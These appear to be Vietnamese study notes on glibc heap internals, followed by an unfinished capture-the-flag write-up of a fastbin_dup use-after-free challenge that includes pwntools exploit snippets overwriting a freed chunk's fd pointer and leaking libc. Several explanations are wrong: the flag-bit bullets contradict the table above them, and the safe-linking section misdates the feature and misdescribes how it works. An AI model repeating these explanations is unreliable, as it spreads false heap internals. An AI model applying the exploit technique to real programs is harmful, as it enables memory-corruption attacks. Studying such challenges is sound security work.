# Heap là gì?

- Bộ nhớ heap là một vùng bộ nhớ được sử dụng để cấp phát động trong chương trình máy tính. Điều này có nghĩa là nó có thể cấp phát một lượng bộ nhớ không biết trước được tại thời điểm biên dịch. Heap thường được sử dụng để cấp phát bộ nhớ cho các đối tượng động được tạo ra trong khi chương trình đang chạy, chẳng hạn như các biến, mảng và cấu trúc dữ liệu.

## Libc là gì?

- Libc sẽ chứa các hàm tiêu chuẩn như malloc, calloc vân vân. Mỗi phiên bản libc offset của các hàm cũng khác nhau. Trong khai thác các challenge về heap, ta cần có được phiên bản đúng trên server (nếu cần). Ta cũng có thể sử dụng một cái gì đó như LD_PRELOAD
  > (LD_PRELOAD là một biến môi trường trong hệ thống Linux. Nó được sử dụng để chỉ định các thư viện được tải trước khi các thư viện khác trong hệ thống.)

## Malloc chunk

- Khi sử dụng hàm malloc, malloc sẽ tạo ra một khối bộ nhớ được gọi là chunk. Mỗi chunk sẽ khác nhau tuỳ vào kích thước khai báo. Chunk gồm `header chunk` để chứa các thông tin về chunk (kích thước, trạng thái - đã được cấp phát hay chưa)
- Trên `x64` header chunk có 0x10 byte và `x86` có 0x8 byte
- Ví dụ, ta có chương trình sau, tạo một vùng nhớ heap, sau đó đưa chuỗi `"panda"` vào trong vùng nhớ heap ấy

```c
void main(void)
{
    char *ptr;

    ptr = malloc(0x10);

    strcpy(ptr, "panda");
}

```

- Khi ta kiểm tra

```
gef➤  search-pattern panda
[+] Searching 'panda' in memory
[+] In '[heap]'(0x555555559000-0x55555557a000), permission=rw-
  0x555555559260 - 0x555555559265  →   "panda"
gef➤  x/4g 0x555555559250
0x555555559250:    0x0    0x21
0x555555559260:    0x61646e6170    0x0
```

- Giống như lí thuyết, phần header sẽ được đặt ở đầu chunk chứa các thông tin sau

```
0x0:    0x00     - Previous Chunk Size
0x8:    0x21     - Chunk Size
0x10:     "panda"     - Content of chunk
```

```
0x0:    0x00     - Previous Chunk Size
```

- Kích thước chunk trước đó chỉ định kích thước một chunk trước đó đã được khai báo
- Ở đây, ta sẽ hiểu kích thước của chunk trước đó như sau
  - Nếu chunk 1 và chunk 2 nằm sau chunk 1 (không nhất thiết là liền kề) thì header chunk thứ 2 không chứa size của chunk thứ 1, nhưng nếu chunk thứ 1 được giải phóng, thì chunk thứ 2 sẽ cập nhật phần header chunk 2 là size của chunk 1(hoặc có thể hiểu là vùng địa chỉ trống trước nó)
  - Nếu ta tạo chunk 3, có size nhỏ hơn vùng nhớ trống trước chunk 2 thì chunk 3 sẽ được đặt trước chunk 2

```
0x8:    0x21     - Chunk Size
```

- Ở đây ta tạo khai báo chunk là 0x10 byte nhưng header nhận 0x21 byte là do 0x10 byte của phần header chunk `x64` và 0x10 là dữ liệu. Nghĩa là `size_khai_báo` + `header_size` = `chunk_size` (làm tròn)
- Ví dụ nếu khai báo 0x15 thì ta sẽ có 0x15 + 0x10 = 0x25 và được làm tròn là 0x30
- Mục đích làm tròn để dễ dàng quản lí hơn
- Ngoài ra, số 0x1 trong cả 0x91 và 0x21 đến từ bit trước đó đang được sử dụng, chỉ ra rằng chunk trước đó đang được sử dụng và không được giải phóng.
- Nếu chunk trước đó không được giải phóng và bạn tạo một chunk mới, kích thước của chunk mới sẽ được tăng thêm 0x1 byte để lưu trữ bit "in-use" của chunk trước đó. Bit "in-use" này chỉ ra rằng chunk trước đó đang được sử dụng và không được giải phóng.

### Ba bit đầu tiên

- Ba bit đầu tiên của kích thước được cấp phát bởi malloc là các cờ (flags) và chúng chỉ ra các thông tin khác nhau (là một phần của lý do để làm tròn kích thước). Nếu bit được thiết lập, điều đó có nghĩa là cờ tương ứng là đúng (và ngược lại)

```
0x1:     Previous in Use     - Specifies that the chunk before it in memory is in use
0x2:    Is MMAPPED               - Specifies that the chunk was obtained with mmap()
0x4:     Non Main Arena         - Specifies that the chunk was obtained from outside of the main arena
```

- Bit đầu tiên (bit cao nhất) được sử dụng để chỉ định kích thước của chunk. Nếu bit này được thiết lập, chunk có kích thước lớn hơn hoặc bằng 512 byte. Nếu bit này không được thiết lập, chunk có kích thước nhỏ hơn 512 byte.
- Bit thứ hai được sử dụng để chỉ định xem chunk có phải là một chunk được cấp phát gần đây hay không. Nếu bit này được thiết lập, chunk được cấp phát gần đây. Nếu bit này được thiết lập, chunk được cấp phát trước đó và đã được giải phóng
- Bit thứ ba được sử dụng để chỉ định xem chunk có phải là một chunk được cấp phát để lưu trữ một con trỏ hay không. Nếu bit này được thiết lập, chunk được cấp phát để lưu trữ một con trỏ. Nếu bit này không được thiết lập, chunk được cấp phát để lưu trữ dữ liệu. Ví dụ: Nếu kích thước được cấp phát là 0x100, bit thứ ba không được thiết lập, do đó chunk này được cấp phát để lưu trữ dữ liệu.

## Binning

- Tạm hiểu là danh sách các vùng nhớ trống, khi một vùng nhớ được giải phóng, nó sẽ lưu vùng nhớ vào bin, và khi khai báo một chunk mới, nó sẽ kiểm tra trong bin vùng nhớ nào phù hợp với chunk đấy

### Fast bin

- Gồm 7 danh sách liên kết, được đánh số và có kích thước tương ứng

```
────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)
Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)
Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)
```

- Ví dụ, chunk 1 có size là 0x30, nó sẽ được đưa vào fast bin và gán index là 2
- Fast bin được tổ chức theo cơ chế LIFO tương tự như stack.
- Ví dụ chunk 0x80 được đưa vào, rồi đến chunk 0x20 thì chunk 0x20 phải được đưa ra trước thì mới có thể đưa chunk 0x80 ra

### tcache

- Thùng tcache tương tự như thùng nhanh (Fast Bins), nhưng có những khác biệt, hoạt động như stack.
- Thùng tcache là một cơ chế phân chia mới được giới thiệu trong phiên bản libc 2.26 (trước đó, bạn sẽ không thấy thùng tcache). Thùng tcache là đặc thù của từng luồng (thread), vì vậy mỗi luồng đều có một thùng tcache riêng của nó.
- Trong các phiên bản libc có thùng tcache, thùng tcache là nơi đầu tiên mà malloc sẽ tìm để phân bổ khối hoặc để đặt các khối được giải phóng vào (vì nó nhanh hơn).
- Khi một khối được giải phóng trong một luồng, nó sẽ được chèn vào thùng tcache của luồng đó thay vì chèn vào fast bin chung. Khi một luồng cần phân bổ một khối mới, nó sẽ tìm kiếm trước trong thùng tcache của chính nó để kiểm tra xem có khối nào đủ kích thước để sử dụng hay không. Việc tìm kiếm này nhanh hơn so với việc tìm kiếm trong thùng fast bin vì không cần phải đồng bộ hóa giữa các luồng.

### Unsorted, Large and Small Bins

- Các bin Small, Large và Unsorted được liên kết chặt chẽ hơn với nhau trong cách thức hoạt động của chúng hơn các bin khác. Các bin Unsorted, Large và Small đều được lưu trữ trong cùng một mảng. Mỗi bin có các chỉ mục khác nhau trỏ đến mảng này:

```
0x00:         Not Used
0x01:         Unsorted Bin
0x02 - 0x3f:  Small Bin
0x40 - 0x7e:  Large Bin
```

- Có một danh sách cho Unsorted Bin, 62 danh sách cho Small Bin và 63 danh sách cho Large Bin.
- Các khối bộ nhớ trong Unsorted Bin không được sắp xếp theo kích thước, mà được lưu trữ trong một danh sách liên kết đơn. Hệ thống sẽ kiểm tra Unsorted Bin trước tiên để tìm kiếm bất kỳ khối bộ nhớ nào có thể
- Khi hệ thống kiểm tra Unsorted Bin, nó cũng sẽ kiểm tra xem có khối bộ nhớ nào có thể thuộc về các danh sách khác như Small Bin hoặc Large Bin hay không.
- Tương tự như fast bin, 62 danh sách của Small Bin và 63 danh sách của Large Bin được chia thành nhiều phần theo kích thước. Các Small Bin trên x64 bao gồm các kích thước khối nhỏ hơn 0x400 (1024 byte), và trên x86 bao gồm các kích thước khối nhỏ hơn 0x200 (512 byte), trong khi large bin bao gồm các khối bộ nhớ có kích thước lớn hơn các giá trị trên đó.

#### So sánh

|                | Unsorted bin                                                                                                                                                                                                                                       | Large bin                                                                                                                                                                                                                       | Small bin                                                                                                                                                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Ưu điểm**    | Thời gian giải phóng khối bộ nhớ nhanh hơn so với các bin khác do không cần sắp xếp lại khối bộ nhớ theo kích thước. Thích hợp cho các khối bộ nhớ có kích thước ngẫu nhiên.                                                                       | Thời gian phân bổ bộ nhớ nhanh hơn so với small bin do chỉ cần tìm kiếm trong danh sách large bin. Giảm thiểu fragmentation bộ nhớ bằng cách giữ các khối bộ nhớ lớn hơn một giá trị ngưỡng nhất định trong cùng một danh sách. | Thời gian phân bổ bộ nhớ nhanh hơn so với large bin do chỉ cần tìm kiếm trong danh sách small bin.Giảm thiểu fragmentation bộ nhớ bằng cách giữ các khối bộ nhớ nhỏ hơn giá trị ngưỡng của large bin trong cùng một danh sách. |
| **Nhược điểm** | Thời gian phân bổ bộ nhớ chậm hơn so với các bin khác do phải tìm kiếm trong danh sách unsorted bin trước. Có thể dẫn đến fragmentation bộ nhớ nếu các khối bộ nhớ được giải phóng và phân bổ liên tục không có giải phóng khối bộ nhớ giữa chúng. | Thời gian giải phóng khối bộ nhớ chậm hơn so với small bin do phải duyệt danh sách liên kết đôi. Có thể dẫn đến wasting space nếu các khối bộ nhớ lớn không được sử dụng hết.                                                   | Thời gian giải phóng khối bộ nhớ chậm hơn so với large bin do phải duyệt danh sách liên kết đơn. Có thể dẫn đến wasting space nếu các khối bộ nhớ nhỏ không được sử dụng hết.                                                  |

## Consolidation

- Chức năng của consolidation là gộp các vùng nhớ trống liền kề với nhau tạo thành một chunk trống lớn hơn
  ví dụ

```
tại các địa chỉ sau có, nếu không sử dụng consolidation
0x1000 (allocated)
0x2000 (free)
0x3000 (free)
0x4000 (allocated)
0x5000 (free)
0x6000 (allocated)
0x7000 (allocated)
```

- Nếu ta khai báo một chunk có kích thước là 0x2000 thì không có chunk trống nào phù hợp (vì nó chưa hiểu có 2 chunk 0x1000 byte đang liền kề nhau)
- Nếu ta sử dụng consolidation

```
0x1000 (allocated)
0x2000 (free + consolidated)
0x3000 (free)
0x4000 (allocated)
0x5000 (free)
0x6000 (allocated)
0x7000 (allocated)
```

- Khi được sử dụng consolidated, hệ thống sẽ hiểu là ta muốn gộp 2 vùng nhớ 0x2000 và 0x3000 thành 1 vùng nhớ trống có kích thước là 0x2000 (không còn là 0x1000 và 0x1000)

## Top chunk

- Top Chunk là một khối bộ nhớ lớn cuối cùng trong heap, được sử dụng để giữ các khối bộ nhớ chưa được phân bổ. Top Chunk cũng là nơi các yêu cầu phân bổ bộ nhớ mới sẽ được xử lý bởi hàm malloc.
- Top chunk được sử dụng để phục vụ các yêu cầu phân bổ chunk mới. Khi một yêu cầu phân bổ mới được gửi đến trình quản lý heap, trình quản lý sẽ tìm kiếm khối bộ nhớ trống đủ lớn để phục vụ yêu cầu đó. Nếu không tìm thấy khối bộ nhớ trống đủ lớn, trình quản lý sẽ tạo ra một khối bộ nhớ mới bằng cách cắt một phần của top chunk và trả về cho yêu cầu phân bổ mới.
- Lấy ví dụ để dễ hiểu
- Ta có một vùng địa chỉ sau:

```
0x1000 (allocated chunk 1)
0x5000 (allocated chunk 2)
0x40000 (top chunk)
```

- giả sử khai báo một chunk 3 có kích thước 0x8000 thì chương trình sẽ trả lại cho ta như sau

```
0x1000 (allocated chunk 1)
0x5000 (allocated chunk 2)
0x40000 (allocated chunk 3)
0x48000 (top chunk)
```

- Do không tìm được vùng trống đủ, top chunk sẽ cắt một phần vùng trống của mình để có đủ vùng trống cho chunk 3

> các kiến thức mới em sẽ cập nhật liên tục

# Use after free

- Lỗ hổng này giúp chúng ta có thể thay đổi các thông tin mà các chunk đã được giải phóng
- Trong một chunk đã được giải phóng sẽ được lưu trong các bin, thì mỗi chunk được giải phóng sẽ có các thông tin về size, địa chỉ và fd bk

# Libc 2.31

- Trong libc 2.31, safe linking được sử dụng để bảo vệ chương trình khỏi lỗ hổng double free trong hàm malloc và free
- Khi một chunk được giải phóng nó sẽ có các thông tin về fd và bk
  ![image](https://user-images.githubusercontent.com/111769169/234791924-86c75a68-970e-4edd-a82d-d0b8ff883cae.png)
  ![image](https://user-images.githubusercontent.com/111769169/234792049-534f6d63-b01d-4709-aa7d-c7d05e3a467c.png)
- Do safe linking hoạt động dựa trên danh sách liên kết đôi nên mỗi phần tử sẽ có 2 fd và bk
  ![image](https://user-images.githubusercontent.com/111769169/234792533-9c0b7ea9-5bfe-458a-9c2b-057ce16cdc57.png)
  > safe linking là cơ chế bảo vệ giúp ngặn chặn các double free dựa trên cơ chế kiểm tra fd và bk của các chunk được free và các chunk trong danh sách bin

# fastbin_dup 2.23

## Source

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+Fh] [rbp-11h] BYREF
  int v4; // [rsp+10h] [rbp-10h] BYREF
  _DWORD size[3]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Ebook v1.0 - Beta version\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        __isoc99_scanf("%c", &v3);
        if ( v4 != 1 )
          break;
        printf("Size: ");
        __isoc99_scanf("%u", size);
        __isoc99_scanf("%c", &v3);
        ptr = malloc(size[0]);
        printf("Content: ");
        read(0, ptr, size[0]);
        *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
      }
      if ( v4 == 2 )
        break;
      switch ( v4 )
      {
        case 3:
          if ( ptr )
          {
            free(ptr);
            puts("Done!");
          }
          else
          {
LABEL_15:
            puts("You didn't buy any book");
          }
          break;
        case 4:
          if ( !ptr )
            goto LABEL_15;
          printf("Content: %s\n", (const char *)ptr);
          break;
        case 5:
          exit(0);
        default:
          puts("Invalid choice!");
          break;
      }
    }
    if ( !ptr )
      goto LABEL_15;
    printf("Content: ");
    read(0, ptr, size[0]);
    *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
  }
}
```

## Ý tưởng

- Mục tiêu vẫn là ghi đè `__free_hook` là `system()`
- Bài này không DBF được như có thể UAF ghi đè `fd` để sinh ra 1 chunk là địa chỉ có quyền ghi, nhưng có thể
- Ta cần nhớ là fastbin là danh sách lưu các chunk đã được giải phóng, nên khi lấy ra, nó sẽ kiểm tra size xem đúng không, size = 0 sẽ báo lỗi ngay, hoặc size chunk đang lấy ra có size bé hơn yêu cầu

## Khai thác

```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x68))
sa(b"Content: ", b"a" * 8)

sla(b"> ", b"3")
sla(b"> ", b"2")
sa(b"Content: ", p64(0x404040 - 19))
```

- Đầu tiên ta tạo 1 chunk, giải phóng nó và tận dụng lỗi UAF để ghi đè `fd`, khi này một chunk mới được sinh ra.
  ![image](https://user-images.githubusercontent.com/111769169/235087863-a5b1958a-8b31-48c8-a6bb-c498803ebb39.png)
- Tuy nhiên, size của chunk mới lại là 0x0, như lí thuyết trên nó sẽ gây ra lỗi
- Vậy ta cần phải tìm vị trí chunk sao cho vị trí chunk nhận giá trị đó là size, nghĩa là vùng header của chunks sẽ có 16 byte, trong đó 8 byte sau sẽ là size của chunk.
- Khi ta trỏ kiểm tra chunk ở `0x404050`, ta thấy 8 byte bên phải là size và = 0
  ![image](https://user-images.githubusercontent.com/111769169/235089080-d6a62de3-96b5-4909-810f-0ea578ef4a60.png)
- Khi này ta cần trừ bớt đi để đưa byte 0x7f vào size chunk
  ![image](https://user-images.githubusercontent.com/111769169/235090553-99252e04-e3f5-4f77-aed5-62832f8b3943.png)
- Khi ấy, chunk của ta có size 0x78
  ![image](https://user-images.githubusercontent.com/111769169/235090920-0c1d9a50-fa64-461e-b43b-dc03e53a0cbc.png)

- Tuy nhiên nó được lưu vào danh sánh có size là 0x80, nghĩa là khi lấy ra nó sẽ kiểm tra chunk đó có size không đủ nên báo lỗi

```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x68))
sa(b"Content: ", b"a" * 8)

sla(b"> ", b"1")
sla(b"Size: ", str(0x68))
sa(b"Content: ", b"aaa")
```

- Chunk sẽ có xu hướng làm tròn lên cho dư xíu =)), nghĩa là 0x70 thì có thể làm tròn 0x80, 0x68 thì làm tròn lên 0x70, do vậy ta có thể yêu cầu 1 chunk 0x68 để chunk 0x78 dư được lấy ra

  ![image](https://user-images.githubusercontent.com/111769169/235094066-f6cece87-546e-4c8d-ab2f-eda33a9d7c0f.png)

- Kiểm tra lại con trỏ ptr
  ![image](https://user-images.githubusercontent.com/111769169/235094803-92d20b56-6cdf-4bba-acdc-91c00387dd83.png)
- Khi này ta cần ghi đè thêm 3 byte có thể leak libc ra

```
gef➤  x/xg 0x40403d
0x40403d:       0x2128fd6540000061
```

- và leak libc

```python
sla(b"> ", b"4")
p.recvuntil(b"aaa")
libc_leak = u64(p.recv(6) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 3786048
info("libc base: " + hex(libc.address))
```

- Đến đây em cần thêm thời gian để tìm hiểu ạ =(
